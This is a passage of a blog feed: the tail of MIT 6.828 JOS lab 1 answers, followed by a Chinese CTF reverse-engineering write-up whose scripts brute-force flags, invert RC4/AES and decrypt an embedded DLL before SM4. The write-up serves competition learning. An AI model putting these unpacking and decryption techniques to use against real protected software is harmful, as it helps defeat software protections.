<code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p>vcprintf-&gt;cons_putc-&gt;va_arg。</p><p>在va_arg前ap指向1，va_arg之后ap指向3。</p><p>fmt的值为”x %d, y %x, z %d\n”字符串地址，ap的值为ebp+0xc。</p></li></ul></li><li><p>Run the following code.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</span><br><span class="line">cprintf(<span class="string">"H%x Wo%s"</span>, <span class="number">57616</span>, &amp;i);</span><br></pre></td></tr></table></figure><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html" target="_blank" rel="noopener">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p>输出是”HE110 World”。H输出，57616以16进制输出是E110，” Wo”也是直接输出的，i被当作字符串输出，由于x86是小端序，因此0x00646c72在内存中实际上是72 6c 64 00这样存储的，即rld\x00。</p><p>若为大端序则i应该等于0x726c6400，而57616不需要改变。</p></li><li><p>In the following code, what is going to be printed after ‘y=’? (note: the answer is not a specific value.) Why does this happen?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cprintf(<span class="string">"x=%d y=%d"</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>会将ebp+0xc处的4字节数据当作整数打印出来，因为格式化字符串中有第二个’%’，而用户只传入了一个参数，但va_arg无法判断变参列表的结尾，会把后续并非参数的数据当作参数打印出来。这也被称为格式化字符串漏洞。</p></li><li><p>Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>vprintfmt中反向遍历格式化字符串，将格式化输出的中间结果暂存在一个足够大的字符数组中，当格式化字符串到了它的起始位置时就输出这个中间结果。</p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab1" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab1</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-启动过程&quot;&gt;&lt;a href=&quot;#1-启动过程&quot; class=&quot;headerlink&quot; title=&quot;1. 启动过程&quot;&gt;&lt;/a&gt;1. 启动过程&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;BIOS&lt;/p&gt;
&lt;p&gt;BIOS由qemu模拟，它会初始化中断描述符表，查找并启动设备</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>2021HWS初赛writeup</title>
    <link href="https://veltavid.github.io/2021/0811c4c4be.html"/>
    <id>https://veltavid.github.io/2021/0811c4c4be.html</id>
    <published>2021-08-16T01:21:52.000Z</published>
    <updated>2021-08-17T01:29:17.253Z</updated>
    
    <content type="html"><![CDATA[<p>年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。</p><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><h4 id="1-decrypt"><a href="#1-decrypt" class="headerlink" title="1.decrypt"></a>1.decrypt</h4><p>主要逻辑就是一个加密，看起来没法逆，但因为加密逻辑简单所以可以自己写一个加密程序逐字节爆破出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="string">b"\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x52\x66\x1D\x52\x66\x67\x68\x67\x65\x6F\x5F\x59\x58\x5E\x6D\x70\xA1\x6E\x70\xA3"</span></span><br><span class="line">map=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">map.append(i)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">sign=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v5 <span class="keyword">in</span> map:</span><br><span class="line">v4=i</span><br><span class="line">origin=v5</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5)</span><br><span class="line">v5 ^= v4</span><br><span class="line">v4 = v3</span><br><span class="line"><span class="keyword">while</span>(v3):</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5)</span><br><span class="line">v5 ^= v4</span><br><span class="line">v4 = v3</span><br><span class="line">r=v5^<span class="number">0x23</span></span><br><span class="line"><span class="keyword">if</span>(r==result[i]):</span><br><span class="line">flag=flag+chr(origin)</span><br><span class="line">print(chr(origin),end=<span class="string">""</span>)</span><br><span class="line">sign=<span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line">print(len(flag))</span><br></pre></td></tr></table></figure><h4 id="2-obfu"><a href="#2-obfu" class="headerlink" title="2.obfu"></a>2.obfu</h4><p>是一个混淆了的加密程序，先将输入的字符串转换成对应的字节，然后将前一字节的低3比特与本字节的高5比特组合成新的字节存入新的数组v12中。接下来会通过一些步骤生成之后加密所需的参数，由于与输入无关所以可以直接动调得到。生成参数的前16字节作为rc4的密钥对v12加密，然后是一个AES解密，密钥与rc4的相同，最后与参数的后16字节异或得到最终结果，将这个结果与密文比较，这个密文也可以通过动调得到。最后把结果输入程序即会生成一个flag.txt文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">true_result=<span class="string">"\x21\x23\x2F\x29\x7A\x57\xA5\xA7\x43\x89\x4A\x0E\x4A\x80\x1F\xC3"</span></span><br><span class="line">v7=<span class="string">"\x6E\xD6\xCE\x61\xBB\x8F\xB7\xF3\x10\xB7\x70\x45\x9E\xFC\xE1\xB1"</span></span><br><span class="line">plain_text=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">plain_text[i]=ord(true_result[i])^ord(v7[i])</span><br><span class="line">shared_key=<span class="string">b"\x8C\xE5\x1F\x93\x50\xF4\x45\x11\xA8\x54\xE1\xB5\xF0\xA3\xFB\xCA"</span></span><br><span class="line"></span><br><span class="line">plain_text=bytes(plain_text)</span><br><span class="line">cipher=AES.new(shared_key,AES.MODE_ECB)</span><br><span class="line">cipher_text=cipher.encrypt(plain_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_decrypted=<span class="string">b"\x2c\xa7\x73\x0e\x86\x3c\xb4\x5f\x8f\x87\xae\x91\xf7\x40\x11\x0d"</span><span class="comment">#通过c语言写的rc4解密脚本得到</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">temp1=(rc4_decrypted[(i+<span class="number">1</span>)%<span class="number">16</span>]&amp;<span class="number">0xe0</span>)&gt;&gt;<span class="number">5</span></span><br><span class="line">temp2=(rc4_decrypted[i%<span class="number">16</span>]&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">3</span></span><br><span class="line">y=temp1|temp2</span><br><span class="line">result=result+str(hex(y))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">print(result[<span class="number">-2</span>:]+result[:<span class="number">-2</span>])</span><br></pre></td></tr></table></figure><p>rc4解密程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KEY 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_STR 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pos_i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pos_j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sbox[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[MAX_KEY]=&#123;<span class="number">0x8C</span>,<span class="number">0xE5</span>,<span class="number">0x1F</span>,<span class="number">0x93</span>,<span class="number">0x50</span>,<span class="number">0xF4</span>,<span class="number">0x45</span>,<span class="number">0x11</span>,<span class="number">0xA8</span>,<span class="number">0x54</span>,<span class="number">0xE1</span>,<span class="number">0xB5</span>,<span class="number">0xF0</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0xCA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> *result)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[MAX_STR]=&#123;<span class="number">0xc0</span>,<span class="number">0x5c</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x7f</span>,<span class="number">0xdb</span>,<span class="number">0x3f</span>,<span class="number">0x4d</span>,<span class="number">0x94</span>,<span class="number">0xb8</span>,<span class="number">0xfe</span>,<span class="number">0x13</span>,<span class="number">0x7</span>,<span class="number">0xe3</span>,<span class="number">0x55</span>,<span class="number">0x26</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> result[MAX_STR]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    encryption((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)str,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)result);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">        sbox[i]=i;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)&#123;</span><br><span class="line">        j=(j+sbox[i]+key[i%key_len])%<span class="number">256</span>;</span><br><span class="line">        temp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">    pos_i=(pos_i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    pos_j = (pos_j+sbox[pos_i])%<span class="number">256</span>;</span><br><span class="line">    temp = sbox[pos_i];</span><br><span class="line">    sbox[pos_i] = sbox[pos_j];</span><br><span class="line">    sbox[pos_j] = temp;</span><br><span class="line">    t = (sbox[pos_i]+sbox[pos_j])%<span class="number">256</span>;</span><br><span class="line">    <span class="keyword">return</span> sbox[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> * result)</span></span>&#123;</span><br><span class="line">    pos_i = <span class="number">0</span>;</span><br><span class="line">    pos_j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)plaintext);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    init_sbox();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        result[i]=plaintext[i]^generate_key();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-babyre"><a href="#3-babyre" class="headerlink" title="3.babyre"></a>3.babyre</h4><p>这道题看上去调用了ZwLoadDriver函数，实际上并没有，动调f7步入一直走会来到一个程序内的函数0x412a20，这个函数中可以看到最后有两个调用分别处理了我们输入的前16字节和后16字节。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/16/r37cq8ID6UwLpfy.png" alt="image-20210201154453065" title="">                </div>                <div class="image-caption">image-20210201154453065</div>            </figure><p>为了找到这个加密函数我们分析之前的0x4113ed函数，一直往里走会看到一个关键的标志CIPHER_DLL，使用resource hacker提取出这个加密的dll即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/16/gdsUxSiFDzkBMoh.png" alt="image-20210201154632782" title="">                </div>                <div class="image-caption">image-20210201154632782</div>            </figure><p>然后解密这个dll的函数如下，就是用wow!做密钥的异或解密。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/16/idJaNWBhKLfo3sT.png" alt="image-20210201154806479" title="">                </div>                <div class="image-caption">image-20210201154806479</div>            </figure><p>最后在解密出的dll偏移0x4f6de处找到加密逻辑，就是以Ez_5M4_C1pH@r!!!为密钥的sm4加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">"wow!"</span></span><br><span class="line">resource_f=open(<span class="string">"./cipher_text"</span>,<span class="string">"rb"</span>)</span><br><span class="line">resource=resource_f.read()</span><br><span class="line">resource_f.close()</span><br><span class="line">plain_text=[]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> resource:</span><br><span class="line">plain_text.append(x^ord(key[i]))</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">plain_text=bytes(plain_text)</span><br><span class="line">plain_f=open(<span class="string">'./plain_text'</span>,<span class="string">"wb"</span>)</span><br><span class="line">plain_f.write(plain_text)</span><br><span class="line">plain_f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBOX = [<span class="string">'d6'</span>, <span class="string">'90'</span>, <span class="string">'e9'</span>, <span class="string">'fe'</span>, <span class="string">'cc'</span>, <span class="string">'e1'</span>, <span class="string">'3d'</span>, <span class="string">'b7'</span>, <span class="string">'16'</span>, <span class="string">'b6'</span>, <span class="string">'14'</span>, <span class="string">'c2'</span>, <span class="string">'28'</span>, <span class="string">'fb'</span>, <span class="string">'2c'</span>, <span class="string">'05'</span>,</span><br><span class="line">       <span class="string">'2b'</span>, <span class="string">'67'</span>, <span class="string">'9a'</span>, <span class="string">'76'</span>, <span class="string">'2a'</span>, <span class="string">'be'</span>, <span class="string">'04'</span>, <span class="string">'c3'</span>, <span class="string">'aa'</span>, <span class="string">'44'</span>, <span class="string">'13'</span>, <span class="string">'26'</span>, <span class="string">'49'</span>, <span class="string">'86'</span>, <span class="string">'06'</span>, <span class="string">'99'</span>,</span><br><span class="line">       <span class="string">'9c'</span>, <span class="string">'42'</span>, <span class="string">'50'</span>, <span class="string">'f4'</span>, <span class="string">'91'</span>, <span class="string">'ef'</span>, <span class="string">'98'</span>, <span class="string">'7a'</span>, <span class="string">'33'</span>, <span class="string">'54'</span>, <span class="string">'0b'</span>, <span class="string">'43'</span>, <span class="string">'ed'</span>, <span class="string">'cf'</span>, <span class="string">'ac'</span>, <span class="string">'62'</span>,</span><br><span class="line">       <span class="string">'e4'</span>, <span class="string">'b3'</span>, <span class="string">'1c'</span>, <span class="string">'a9'</span>, <span class="string">'c9'</span>, <span class="string">'08'</span>, <span class="string">'e8'</span>, <span class="string">'95'</span>, <span class="string">'80'</span>, <span class="string">'df'</span>, <span class="string">'94'</span>, <span class="string">'fa'</span>, <span class="string">'75'</span>, <span class="string">'8f'</span>, <span class="string">'3f'</span>, <span class="string">'a6'</span>,</span><br><span class="line">       <span class="string">'47'</span>, <span class="string">'07'</span>, <span class="string">'a7'</span>, <span class="string">'fc'</span>, <span class="string">'f3'</span>, <span class="string">'73'</span>, <span class="string">'17'</span>, <span class="string">'ba'</span>, <span class="string">'83'</span>, <span class="string">'59'</span>, <span class="string">'3c'</span>, <span class="string">'19'</span>, <span class="string">'e6'</span>, <span class="string">'85'</span>, <span class="string">'4f'</span>, <span class="string">'a8'</span>,</span><br><span class="line">       <span class="string">'68'</span>, <span class="string">'6b'</span>, <span class="string">'81'</span>, <span class="string">'b2'</span>, <span class="string">'71'</span>, <span class="string">'64'</span>, <span class="string">'da'</span>, <span class="string">'8b'</span>, <span class="string">'f8'</span>, <span class="string">'eb'</span>, <span class="string">'0f'</span>, <span class="string">'4b'</span>, <span class="string">'70'</span>, <span class="string">'56'</span>, <span class="string">'9d'</span>, <span class="string">'35'</span>,</span><br><span class="line">       <span class="string">'1e'</span>, <span class="string">'24'</span>, <span class="string">'0e'</span>, <span class="string">'5e'</span>, <span class="string">'63'</span>, <span class="string">'58'</span>, <span class="string">'d1'</span>, <span class="string">'a2'</span>, <span class="string">'25'</span>, <span class="string">'22'</span>, <span class="string">'7c'</span>, <span class="string">'3b'</span>, <span class="string">'01'</span>, <span class="string">'21'</span>, <span class="string">'78'</span>, <span class="string">'87'</span>,</span><br><span class="line">       <span class="string">'d4'</span>, <span class="string">'00'</span>, <span class="string">'46'</span>, <span class="string">'57'</span>, <span class="string">'9f'</span>, <span class="string">'d3'</span>, <span class="string">'27'</span>, <span class="string">'52'</span>, <span class="string">'4c'</span>, <span class="string">'36'</span>, <span class="string">'02'</span>, <span class="string">'e7'</span>, <span class="string">'a0'</span>, <span class="string">'c4'</span>, <span class="string">'c8'</span>, <span class="string">'9e'</span>,</span><br><span class="line">       <span class="string">'ea'</span>, <span class="string">'bf'</span>, <span class="string">'8a'</span>, <span class="string">'d2'</span>, <span class="string">'40'</span>, <span class="string">'c7'</span>, <span class="string">'38'</span>, <span class="string">'b5'</span>, <span class="string">'a3'</span>, <span class="string">'f7'</span>, <span class="string">'f2'</span>, <span class="string">'ce'</span>, <span class="string">'f9'</span>, <span class="string">'61'</span>, <span class="string">'15'</span>, <span class="string">'a1'</span>,</span><br><span class="line">       <span class="string">'e0'</span>, <span class="string">'ae'</span>, <span class="string">'5d'</span>, <span class="string">'a4'</span>, <span class="string">'9b'</span>, <span class="string">'34'</span>, <span class="string">'1a'</span>, <span class="string">'55'</span>, <span class="string">'ad'</span>, <span class="string">'93'</span>, <span class="string">'32'</span>, <span class="string">'30'</span>, <span class="string">'f5'</span>, <span class="string">'8c'</span>, <span class="string">'b1'</span>, <span class="string">'e3'</span>,</span><br><span class="line">       <span class="string">'1d'</span>, <span class="string">'f6'</span>, <span class="string">'e2'</span>, <span class="string">'2e'</span>, <span class="string">'82'</span>, <span class="string">'66'</span>, <span class="string">'ca'</span>, <span class="string">'60'</span>, <span class="string">'c0'</span>, <span class="string">'29'</span>, <span class="string">'23'</span>, <span class="string">'ab'</span>, <span class="string">'0d'</span>, <span class="string">'53'</span>, <span class="string">'4e'</span>, <span class="string">'6f'</span>,</span><br><span class="line">       <span class="string">'d5'</span>, <span class="string">'db'</span>, <span class="string">'37'</span>, <span class="string">'45'</span>, <span class="string">'de'</span>, <span class="string">'fd'</span>, <span class="string">'8e'</span>, <span class="string">'2f'</span>, <span class="string">'03'</span>, <span class="string">'ff'</span>, <span class="string">'6a'</span>, <span class="string">'72'</span>, <span class="string">'6d'</span>, <span class="string">'6c'</span>, <span class="string">'5b'</span>, <span class="string">'51'</span>,</span><br><span class="line">       <span class="string">'8d'</span>, <span class="string">'1b'</span>, <span class="string">'af'</span>, <span class="string">'92'</span>, <span class="string">'bb'</span>, <span class="string">'dd'</span>, <span class="string">'bc'</span>, <span class="string">'7f'</span>, <span class="string">'11'</span>, <span class="string">'d9'</span>, <span class="string">'5c'</span>, <span class="string">'41'</span>, <span class="string">'1f'</span>, <span class="string">'10'</span>, <span class="string">'5a'</span>, <span class="string">'d8'</span>,</span><br><span class="line">       <span class="string">'0a'</span>, <span class="string">'c1'</span>, <span class="string">'31'</span>, <span class="string">'88'</span>, <span class="string">'a5'</span>, <span class="string">'cd'</span>, <span class="string">'7b'</span>, <span class="string">'bd'</span>, <span class="string">'2d'</span>, <span class="string">'74'</span>, <span class="string">'d0'</span>, <span class="string">'12'</span>, <span class="string">'b8'</span>, <span class="string">'e5'</span>, <span class="string">'b4'</span>, <span class="string">'b0'</span>,</span><br><span class="line">       <span class="string">'89'</span>, <span class="string">'69'</span>, <span class="string">'97'</span>, <span class="string">'4a'</span>, <span class="string">'0c'</span>, <span class="string">'96'</span>, <span class="string">'77'</span>, <span class="string">'7e'</span>, <span class="string">'65'</span>, <span class="string">'b9'</span>, <span class="string">'f1'</span>, <span class="string">'09'</span>, <span class="string">'c5'</span>, <span class="string">'6e'</span>, <span class="string">'c6'</span>, <span class="string">'84'</span>,</span><br><span class="line">       <span class="string">'18'</span>, <span class="string">'f0'</span>, <span class="string">'7d'</span>, <span class="string">'ec'</span>, <span class="string">'3a'</span>, <span class="string">'dc'</span>, <span class="string">'4d'</span>, <span class="string">'20'</span>, <span class="string">'79'</span>, <span class="string">'ee'</span>, <span class="string">'5f'</span>, <span class="string">'3e'</span>, <span class="string">'d7'</span>, <span class="string">'cb'</span>, <span class="string">'39'</span>, <span class="string">'48'</span>,]</span><br><span class="line">FK = [<span class="string">'a3b1bac6'</span>, <span class="string">'56aa3350'</span>, <span class="string">'677d9197'</span>, <span class="string">'b27022dc'</span>]</span><br><span class="line">CK = [<span class="string">'00070e15'</span>, <span class="string">'1c232a31'</span>, <span 